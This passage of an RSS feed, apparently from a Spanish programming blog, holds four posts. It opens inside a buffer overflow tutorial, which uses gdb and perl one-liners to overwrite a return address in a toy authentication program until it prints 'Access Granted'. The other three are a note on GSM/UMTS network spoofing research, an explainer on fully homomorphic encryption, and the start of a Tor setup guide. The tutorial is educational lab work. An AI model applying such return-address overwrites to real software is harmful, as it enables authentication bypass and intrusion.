&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; x/10xg $rsp
0x7fffffffe380: 0x00007fffffffe3bf  0x00007fffffffe74b
0x7fffffffe390: 0x0000000000000001  0x000000000040078d
0x7fffffffe3a0: 0x00007ffff7a65c48  0x0000000000400730
0x7fffffffe3b0: 0x00007fffffffe3d0  &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0x00000000004006ea&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
0x7fffffffe3c0: 0x00007fffffffe4b8  0x0000000200000000
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;En 32-bits el puntero de pila se llamaba ESP, en 64-bit es RSP. En este caso la dirección de retorno es &lt;code&gt;0x00000000004006ea&lt;/code&gt;. Desensamblando la función main como anteriormente,vemos que la dirección de retorno que nos interesa es &lt;code&gt;0x00000000004006ee&lt;/code&gt;, igual que antes, usamos perl &amp;#8212; &lt;strong&gt;$(perl -e &amp;#8216;print &amp;#8220;xeex06x40x00x00x00x00x00&amp;#8243;x10&amp;#8242;) &amp;#8212;&lt;/strong&gt; sobrescribiendo la dirección por la que nos interesa, quedando así:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; c
Continuing.

Breakpoint 2, check_authentication &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0x7fffffffe74b &lt;span class=&#34;s2&#34;&gt;&amp;quot;356�06@356�06@356�06@356�06@356�06@356�06@356�06@356�06@356�06@356�06@&amp;quot;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at auth_overflow2.c:16
&lt;span class=&#34;m&#34;&gt;16&lt;/span&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; auth_flag&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; x/10xg $rsp
0x7fffffffe380: 0x00007fffffffe3bf  0x00007fffffffe74b
0x7fffffffe390: 0x06ee4006ee4006ee  0xee4006ee4006ee40
0x7fffffffe3a0: 0x4006ee4006ee4006  0x00004006ee4006ee
0x7fffffffe3b0: 0x00007fffffffe3d0  &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0x00000000004006ea&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
0x7fffffffe3c0:  0x00007fffffffe4b8  0x0000000200000000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Aunque parece que no hemos sobreescrito la dirección de retorno, sí que lo hemos hecho, pero no se han escrito los ceros por la izquierda, quedando todo desplazado:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; c
Continuing.

Breakpoint 2, check_authentication &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0x7fffffffe74b &lt;span class=&#34;s2&#34;&gt;&amp;quot;356�06@356�06@356�06@356�06@356�06@356�06@356�06@356�06@356�06@356�06@&amp;quot;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at auth_overflow2.c:16
&lt;span class=&#34;m&#34;&gt;16&lt;/span&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; auth_flag&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; c
Continuing.

-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-
      Access Granted.
-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Inferior &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;process 3699&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; exited with code 034&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Para comprobar que sí que se sobreescribe, vamos a introducir una dirección sin ceros:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; run &lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;perl -e &lt;span class=&#34;s1&#34;&gt;&amp;#39;print &amp;quot;xaaxaaxaaxaaxaaxaaxaaxaa&amp;quot;x10&amp;#39;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;
Breakpoint 2, check_authentication &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0x7fffffffe719 &lt;span class=&#34;s2&#34;&gt;&amp;quot;252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252&amp;quot;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
    at auth_overflow2.c:16
&lt;span class=&#34;m&#34;&gt;16&lt;/span&gt;     &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; auth_flag&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; x/10xg $rsp
0x7fffffffe380: 0x00007fffffffe38f  0x00007fffffffe719
0x7fffffffe390: 0xaaaaaaaaaaaaaaaa  0xaaaaaaaaaaaaaaaa
0x7fffffffe3a0: 0xaaaaaaaaaaaaaaaa  0xaaaaaaaaaaaaaaaa
0x7fffffffe3b0: 0xaaaaaaaaaaaaaaaa  &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0xaaaaaaaaaaaaaaaa&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
0x7fffffffe3c0: 0xaaaaaaaaaaaaaaaa  0xaaaaaaaaaaaaaaaa
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;En estos casos no nos es muy útil el buffer overflow, ya que solo podemos saltar a porciones del código existente, en entradas posteriores, veremos cómo conseguir una shell root.&lt;/p&gt;

&lt;p&gt;Espero que os haya gustado.&lt;/p&gt;</description>
        </item>
        
        <item>
            <title>Hacking y Seguridad en Comunicaciones Móviles GSM / GPRS / UMTS / LTE</title>
            <link>https://elbauldelprogramador.com/hacking-y-seguridad-en-comunicaciones/</link>
            <pubDate>Fri, 01 Jan 2016 00:00:00 +0000</pubDate>
            
            <guid>https://elbauldelprogramador.com/hacking-y-seguridad-en-comunicaciones/</guid>
            <description>&lt;p&gt;Os dejo un vídeo que demuestra como se puede suplantar la identidad de una red GSM / GPRS / UMTS / LTE.&lt;/p&gt;

&lt;p&gt;El vídeo es de la &lt;strong&gt;&lt;em&gt;RootedCON 2011&lt;/em&gt;&lt;/strong&gt; de este año.&lt;/p&gt;

&lt;p&gt;Visitar el vídeo en Vimeo: &lt;a href=&#34;https://vimeo.com/27258284 &amp;quot;David Pérez y José Picó - Un ataque práctico contra comunicaciones móviles (Rooted CON 2011&#34;&gt;David Pérez y José Picó - Un ataque práctico contra comunicaciones móviles (Rooted CON 2011)&lt;/a&gt;&amp;rdquo;)&lt;/p&gt;

&lt;p&gt;Una de las características que se conocen desde hace mucho tiempo es la posibilidad de falsificar, es decir, suplantar, a un operador de telefonía al que se conectan los teléfonos móviles. Normalmente, todos los usuarios que cuentan con un teléfono de última generación, como un iPhone o un Smartphone, lo tienen configurado para conectarse automáticamente a las redes.&lt;/p&gt;

&lt;p&gt;Esta suplantación, que se puede hacer a las redes GSM, se puede extender, como enseñan desde hace más de un año los investigadores españoles José Picó y David Perez a las redes UMTS, es decir, a las tecnologías GPRS y EDGE. Si el dispositivo no tiene configurada la opción de conectarse solo a redes 3G o 3.5G, un atacante podrá simular ser cualquier operador ya que en las tecnologías GPRS y EDGE no se autentica la red, es decir, basta con suplantar el nombre de la red y engañar al usuario.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Fuente: &lt;a target=&#34;_blank&#34; href=&#34;http://www.elladodelmal.com/2011/11/nuevo-libro-de-hacking-y-seguridad-en.html&#34;&gt;elladodelmal&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Más info: &lt;a target=&#34;_blank&#34; href=&#34;http://www.seguridadapple.com/2011/01/atacando-iphone-e-ipad-con-redes-falsas.html&#34;&gt;seguridadApple&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        
        <item>
            <title>Lo último en criptografía: Fully Homomorphic Encryption</title>
            <link>https://elbauldelprogramador.com/lo-ultimo-en-criptografia-fully-homomorphic-encryption/</link>
            <pubDate>Fri, 01 Jan 2016 00:00:00 +0000</pubDate>
            
            <guid>https://elbauldelprogramador.com/lo-ultimo-en-criptografia-fully-homomorphic-encryption/</guid>
            <description>&lt;p&gt;&lt;a href=&#34;https://elbauldelprogramador.com/img/2012/11/Apps-preferences-desktop-cryptography-icon1.png&#34;&gt;&lt;img on=&#34;tap:lightbox1&#34; role=&#34;button&#34; tabindex=&#34;0&#34; layout=&#34;responsive&#34; title=&#34;Homomorphic Encryption&#34; src=&#34;https://elbauldelprogramador.com/img/2012/11/Apps-preferences-desktop-cryptography-icon1.png&#34; alt=&#34;&#34; width=&#34;256px&#34; height=&#34;256px&#34; /&gt;&lt;/a&gt;
Me he aficionado a escuchar un programa de radio llamado &lt;strong&gt;Security Now!&lt;/strong&gt;, cuya web puedes consultar en las referencias. Como el nombre del programa indica, hablan sobre seguridad en sistemas informáticos principalmente. El episodio de esta semana iba enfocado a qué se está desarrollando a día de hoy en el mundo de la criptografía.&lt;/p&gt;

&lt;p&gt;Pues bien, una de esas cosas en las que los criptógrafos están trabajando a dia de hoy se llama &lt;strong&gt;Homomorphic Encryption&lt;/strong&gt; (Cifrado Homomórfico) ó &lt;strong&gt;Fully Homomorphic Encryption&lt;/strong&gt; (Cifrado totalmente homomórfico).&lt;/p&gt;

&lt;h3 id=&#34;qué-es-el-cifrado-homomórfico-ó-homomorphic-encryption&#34;&gt;¿Qué es el cifrado homomórfico ó &lt;strong&gt;Homomorphic Encryption&lt;/strong&gt;?&lt;/h3&gt;

&lt;p&gt;Los chicos de &lt;a href=&#34;http://es.wikipedia.org/wiki/RSA&#34; target=&#34;_blank&#34;&gt;RSA&lt;/a&gt; plantearon la hipótesis de este sistema de cifrado en el año 78. Postularon la posibilidad del cifrado homomórfico o ****Homomorphic Encryption. ****Pero se quedó como una pregunta abierta.&lt;/p&gt;

&lt;p&gt;Y hace solo tres años un estudiante de posgrado sorprendió al mundo al demostrar que este sistema es posible. Lo que este estudiante hizo fue demostrar matemáticamente que es posible realizar operaciones de cálculo estándares &amp;#8212; como sumar, multiplicar etc &amp;#8212; a datos cifrados sin la necesidad de descifrarlos previamente.&lt;/p&gt;

&lt;p&gt;Por ejemplo, es posible cifrar datos, enviarlos a la &lt;em&gt;nube&lt;/em&gt; y operar sobre estos datos **sin descifrarlos ** . La *nube *no tiene la menor idea del contenido de los datos sobre los que está operando, no vé ningún resultado intermedio. La totalidad de los datos permanecen cifrados durante todo el tiempo. De manera que obtienes el resultado encriptado, y solamente tú puedes desencriptarlo. En eso consiste el cifrado homomórfico o** **Homomorphic Encryption, ** **y funciona.
&lt;!--ad--&gt;&lt;/p&gt;

&lt;h3 id=&#34;analizando-los-sistemas-de-cifrado-actuales&#34;&gt;Analizando los sistemas de cifrado actuales&lt;/h3&gt;

&lt;p&gt;De acuerdo al glosario de definiciones de los laboratorios RSA, definen &lt;strong&gt;probabilistic encryption&lt;/strong&gt; (Cifrado probabilístico) al algoritmo que produce resultados cifrados distinos cada vez que se usa, aunque sea con los mismos datos. Esta definición rompe con el esquema del **deterministic encryption &lt;strong&gt;(Cifrado determinista) el cual produce siempre la misma salida para un mismo dato de entrada, es decir, dado un valor de entrada a encriptar, el resultado de cifrar dicho dato será siempre el mismo, con lo cual existe una forma de invertir el proceso. Más técnicamente, el cifrado probabilístico (&lt;/strong&gt;probabilistic encryption**) se define así:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;El cifrado probabilístico &amp;#8212; **probabilistic encryption **es un diseño de cifrado en el cual un mensaje es encriptado en uno de muchos posibles **ciphertext **, y no en uno solo como ocurre en el cifrado determinístico **(deterministic encryption) **. Siendo así muy poco probable obtener información parcial sobre el &lt;strong&gt;ciphertext.&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;En enfoques anteriores de cifrado, a pesar de que no siempre se sabía cuando era posible obtener dicha información parcial, no se demostró que no era posible hacerlo.&lt;/p&gt;

&lt;p&gt;Lo que esta definición quiere decir es que nunca se ha demostrado que la clave pública estandar RSA sea segura. Se basa en la presunta dificultad de factorizar numeros primos enormes. Pero nadie ha sido capaz de demostrar que sea dificil factorizarlos. Simplemente sabemos que es complicado.&lt;/p&gt;

&lt;p&gt;Sin embargo saber algo, y demostrarlo, son dos mundos aparte en términos de la tecnología de criptografía académica.&lt;/p&gt;

&lt;p&gt;Así que poco después de que los primeros desarrolladores de RSA inventaran este cifrado asimétrico basado en factorización, se dieron cuenta de que su enfoque tenía una propiedad, llamada **homomorfismo (homomorphism) **. Y escribieron sobre esto pocos meses después de desarrollar RSA.&lt;/p&gt;

&lt;p&gt;La palabra &lt;strong&gt;homomorfismo&lt;/strong&gt; viene de &lt;strong&gt;Homo&lt;/strong&gt; y &lt;strong&gt;mórfica&lt;/strong&gt;, que significa *de la misma forma. *Es decir, la posibilidad de aplicar distintos procesos un mismo dato y obtener el mismo resultado. Un ejemplo simple es la multiplicación, si &lt;strong&gt;a*b=c&lt;/strong&gt; también sabemos que &lt;strong&gt;log(a) + log(b) = log&amp;copy;&lt;/strong&gt;, por tanto, estas operaciones son homomórficas.&lt;/p&gt;

&lt;p&gt;Bien, pues esta idea del homomorfismo ha sido lo que el estudiante mencionado al principio del artículo demostró en su tesis doctoral en 2009, su nombre es Craig Gentry y sorprendió al mundo de la criptografía al presentar un sistema criptográfico homomórfico totalmente funcional. Craig Gentry demostró en sus tesis que es absolutamente posible realizar operaciones de suma y multiplicación sobre información cifrada, sin necesidad de descifrarla en ninguna fase del proceso. Como consecuencia, nadie puede obtener información de los datos sobre los que se está operando. Cuando el resultado de la operación se devuelve a la persona propietaria de esos datos, solo dicha persona puede descifrarlos con su clave. Y el resultado de los datos descifrados es el mismo que se habría obtenido al realizar estas operaciones a datos no cifrados.&lt;/p&gt;

&lt;p&gt;Las aplicaciones que tiene este sistema son enormes, por ejemplo las corporaciones podrían dejar en la nube sus datos de manera segura y además realizar operaciones a éstos, y obtener un resultado. De hecho, se han desarrollado &lt;strong&gt;motores de búsqueda&lt;/strong&gt; en los cuales el buscador no conoce la consulta que realiza el usuario ni el resultado de la misma, simplemente devuelve el resultado y luego es el usuario quien descifra el resultado para obtener la respuesta a la consulta realizada con total privacidad.&lt;/p&gt;

&lt;p&gt;Continuando con la tarea de entender cómo funciona el &lt;strong&gt;cifrado probabilístico&lt;/strong&gt; o &lt;strong&gt;probabilistic encryption&lt;/strong&gt; vamos a profundizar un poco en el tema.&lt;/p&gt;

&lt;h3 id=&#34;cifrado-probabilístico&#34;&gt;Cifrado probabilístico&lt;/h3&gt;

&lt;p&gt;Imaginemos un sistema de cifrado sencillo, de una dimensión, una buena analogía sería una cuerda con nudos a lo largo de la misma. Éstos nodos, o nudos, representan valores claramente conocidos a consecuencia de su posición. El hecho de cifrar es elegir un nodo de esta cuerda y añadirle ruido deliberadamente, desplazando así la posición del nodo una cantida pseudoaleatoria con respecto a la original.&lt;/p&gt;

&lt;p&gt;La función que tiene una clave (&lt;strong&gt;key&lt;/strong&gt;) en los sistemas cifrados es determinar dónde están estos nodos que no distribuidos de manera uniforme. Se requiere de un cálculo muy complejo para averiguar dónde se situan, de modo que solo alguien con la clave puede saberlo. Y sobre estos datos con ruido podemos operar y obtener un resultado, como sumar . Se pueden elegir dos números, añadirles ruido, sumarlos y obtener un resultado. Por lo tanto también se está sumando el ruido de cada uno de los números. El resultado será una función que tendrá como entrada los dos sumandos y el ruido correspondiente a cada uno de ellos.&lt;/p&gt;

&lt;p&gt;No habrá problema siempre y cuando no haya demasiado ruido, la suma será correcta. El ruido es la razón por la cual quién hace las operaciones no puede sacar nada en claro del resultado, todo lo que sabe es ha recibido una pareja de valores y los está sumando, y no conocerá el resultado porque está calculado relativamente a los nodos. Y ese desplazamiento relativo solo lo conoce la persona con la &lt;strong&gt;clave.&lt;/strong&gt; Para resumir, el proceso que realiza las operaciones sabe qué tipo de operaciones está realizando, pero no tiene ni idea de los datos subyacentes.&lt;/p&gt;

&lt;p&gt;Todo este proceso que acabo de explicar es una mínima parte de como funciona el cifrado probabilístico, ya que solo se ha aplicado a una dimensión (Una sola cuerda con nodos.). En realidad se hace con un concepto algebráico llamado *&lt;a href=&#34;http://es.wikipedia.org/wiki/Ret%C3%ADculo_%28matem%C3%A1ticas%29&#34; target=&#34;_blank&#34;&gt;lattice (Retículo)&lt;/a&gt;**, *y son espacios n-dimensionales interconectados con dimensiones del rango de 512, 2048 o mayores. Seguramente puedas visualizar un cubo de 3 dimensiones, y aunque no seas capaz de visualizar una figura de 512 dimensiones, se puede representar matemáticamente.&lt;/p&gt;

&lt;p&gt;Los sistemas homomórficos trabajan en estos retículos hiper-dimensionales añadiendo ruido a los nodos para deplazarlos con respecto a su posición original. Como se ha mencionado en los párrafos anteriores, el problema está en que el ruido se va acumulando, en operaciones de suma se duplica cuando hay dos sumandos, y en la multiplicación se eleva al cuadrado cuando se multiplican dos números. Con lo que el ruido se va de las manos muy rápidamente, como consecuencia se está limitado a un número determinado de operecaciones antes de que el ruido interfiera demasiado en los datos reales.&lt;/p&gt;

&lt;p&gt;Un sistema &lt;strong&gt;Fully Homomorphic Encryption&lt;/strong&gt; (Cifrado totalmente homomórfico) no tiene esta limitación, por definición es posible realizar cualquier tipo de operación, por muy compleja que sea. Craig consiguió evitar que el ruido quedara fuera de control porque, tras realiazar un número determinado de operaciones, los datos se vuelven a cifrar (Sin descifrarlos previamente, es decir, el cifrado homomórfico realiza su propio cifrado) elimiando el ruido de modo que nunca sobrepase el sistema.
Craig implementó este sistema en IBM. Tiene cuatro tipos de escalas del sistema. Uno **pequeño al que llama 2⁹ de 512 dimensiones, otro de 2¹¹, uno mediano de 2¹³ y el mayor de todos de 2¹⁵.&lt;/p&gt;

&lt;p&gt;Aunque aún estamos muy lejos de ver esto implementado en las tecnologías actuales, porque actualmente no están preparadas para soportarlo. La razón es sencilla, el sistema **homomórfico ** a secas, no el Totalmente cifrado (Fully Homomorfic) requiere para el sistema más pequeño, el de 512 dimensiones, un ancho de palabra de 200.000 bits, lo cual es enorme. La clave pública usada en el **sistema totalmente homomórfico **tiene un tama��o de 17MB y necesita 2.4 segundos para generarse usando la máquina estandar más potente. El sistema mayor, el de 2¹⁵, de 32768 dimensiones requiere dos horas para generar la clave y ocupa 2.3GB.&lt;/p&gt;

&lt;p&gt;En resumen, es una forma completamente distinta de cifrar y tratar datos para la cual los computadores estándares actuales de 64-bits de ancho de palabra no están capacitados.&lt;/p&gt;

&lt;p&gt;Este sistema tiene un gran futuro y estamos tan solo al comienzo, como siempre pasa en criptografía, el sistema avanzará rápido y mejorará. Se encontrarán atajos, nuevas formas de hacer las mismas cosas. La idea de ruido en un retículo es solo una de las posibilidades de un esquema de cifrado no-determinista que han sido propuestas, hay otras. Como usar máximos comunes divisores entre otras.&lt;/p&gt;

&lt;p&gt;Queda así abierto un nuevo campo en la investigación criptográfica. De aquí a 20, 30 años habrá aplicaciones que funcionarán de un modo totalmente distinto al que estamos acostumbrados, y la gente se preguntará ¿No se ha hecho el cifrado siempre de esta manera?, y no será así, recordaremos lo que solíamos usar y nos daremos cuenta que era estúpido en comparación.&lt;/p&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;

&lt;p class=&#34;alert&#34;&gt;
&lt;strong&gt;NOTA:&lt;/strong&gt;Este artículo ha sido escrito a partir del episodio 376 de Security Now!, no me atribuyo ninguna autoría, simplemente he escuchado el episodio y he plasmado lo que he aprendido. A continuación proporciono los enlaces correspondientes al episodio
&lt;/p&gt;

&lt;h3 id=&#34;referencias&#34;&gt;Referencias&lt;/h3&gt;

&lt;p&gt;&lt;em&gt;Transcipciones a texto y audio del episodio&lt;/em&gt; »» &lt;a href=&#34;http://www.grc.com/securitynow.htm&#34; target=&#34;_blank&#34;&gt;grc.com&lt;/a&gt;
&lt;em&gt;Episode 376: Fully Homomorphic Encryption&lt;/em&gt; »» &lt;a href=&#34;http://twit.tv/show/security-now/376&#34; target=&#34;_blank&#34;&gt;twit.tv&lt;/a&gt;&lt;/p&gt;</description>
        </item>
        
        <item>
            <title>Logrando el anonimato con Tor (Parte 1)</title>
            <link>https://elbauldelprogramador.com/logrando-el-anonimato-con-tor-parte-1/</link>
            <pubDate>Fri, 01 Jan 2016 00:00:00 +0000</pubDate>
            
            <guid>https://elbauldelprogramador.com/logrando-el-anonimato-con-tor-parte-1/</guid>
            <description>&lt;ul&gt;
&lt;li&gt;Logrando el anonimato con Tor (Parte 1)

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://elbauldelprogramador.com/logrando-el-anonimato-con-tor-parte-2-proxies-y-servidores-de-dns/&#34;&gt;Logrando el anonimato con Tor (Parte 2): Servidores DNS y Proxies&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://elbauldelprogramador.com/logrando-el-anonimato-con-tor-parte-3-torbutton-y-tsocks/&#34; title=&#34;Logrando el anonimato con Tor (Parte 3) : Torbutton y Tsocks&#34;&gt;Logrando el anonimato con Tor (Parte 3): TorButton y Tsocks&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://elbauldelprogramador.com/logrando-el-anonimato-con-tor-parte-4/&#34; title=&#34;Logrando el anonimato con Tor (Parte 4) – Tor para relés&#34;&gt;Logrando el anonimato con Tor (Parte 4): Tor para relés&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Todos sabemos que Tor nos permite navegar anónimamente en Internet. En este artículo veremos cómo lograrlo y verdaderamente saber contra qué luchamos.&lt;/p&gt;

&lt;p&gt;Primero instalemos Tor y empecemos a usarlo para desasirnos de algunas cosas. Hay muchos tutoriales en Internet que describen cómo instalar y usar Tor, pero mencionemos una vez más todos los pasos requeridos.&lt;/p&gt;

&lt;h2 id=&#34;1-instalación&#34;&gt;1. Instalación&lt;/h2&gt;

&lt;p&gt;Asumiremos que usas la distribución Ubuntu Linux, sin embargo los pasos son relevantes a su vez para otras distribuciones. Primero veamos &lt;a href=&#34;https://elbauldelprogramador.com/logrando-el-anonimato-con-tor-parte-2-proxies-y-servidores-de-dns/&#34;&gt;1&lt;/a&gt; cómo agregar el repositorio correcto a la lista de fuentes. En caso de que uses Ubuntu 10.04 - las mismas versiones que Backtrack 5 R2 usa - ejecuta los siguientes comandos:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;lang&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;bash&amp;quot;&lt;/span&gt;&amp;gt;# &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;quot;deb http://deb.torproject.org/torproject.org lucid main&amp;quot;&lt;/span&gt; &amp;gt;&amp;gt; /etc/apt/sources.list
 &lt;span class=&#34;c1&#34;&gt;# echo &amp;quot;deb-src http://deb.torproject.org/torproject.org lucid main&amp;quot; &amp;gt;&amp;gt; /etc/apt/sources.list&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Luego instalemos Tor y Privoxy:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;# apt-get update&lt;/span&gt;
 &lt;span class=&#34;c1&#34;&gt;# apt-get install tor privoxy&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;En este punto deberíamos mencionar que ambos son:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Tor: es usado para conectarnos con una red anónima sobre TCP&lt;/li&gt;
&lt;li&gt;Privoxy: es usado para conectar nuestro navegador sobre un proxy HTTP.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Agrega la siguiente línea al archivo &lt;code&gt;/etc/privoxy/config&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;# echo &amp;quot;forward-socks4a / &amp;lt;a href=&amp;quot;http://127.0.0.1:9050&amp;quot; target=&amp;quot;_blank&amp;quot;&amp;gt;127.0.0.1:9050&amp;lt;/a&amp;gt; .&amp;quot; &amp;gt;&amp;gt; /etc/privoxy/config&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Además debes agregar las siguientes línas al archivo &lt;code&gt;/etc/tor/torrc&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;!--ad--&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;AvoidDiskWrites 1
ControlPort 9051
Log notice stdout
SafeSocks 1
WarnUnsafeSocks 1
SocksListenAddress 127.0.0.1
SocksPort 9050
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Por el momento no entraremos en detalles sobre qué significa cada opción, pero describiremos las variables de configuración interesantes más adelante. Primero iniciemos Tor y Privoxy:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;# /etc/init.d/tor start&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# /etc/init.d/privoxy start&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Esto debería abrir dos puertos, el 9050 para Tor y el 8118 para Privoxy. Comprobemoslo:&lt;/p&gt;
